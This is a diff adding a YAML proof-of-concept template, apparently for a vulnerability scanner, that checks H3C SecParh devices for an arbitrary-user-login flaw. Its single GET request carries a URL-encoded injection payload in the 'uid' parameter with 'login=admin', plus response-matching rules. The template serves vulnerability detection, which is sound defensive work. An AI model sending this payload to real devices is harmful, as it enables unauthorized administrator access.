@@ -1,0 +1,22 @@
+id: poc-yaml-h3c-secparh-any-user-login
+info:
+  name: H3c Secparh 任意用户登录漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: h3c
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "错误的id") && matches(body, "审计管理员")
+    && matches(body, "admin")
+  output: []
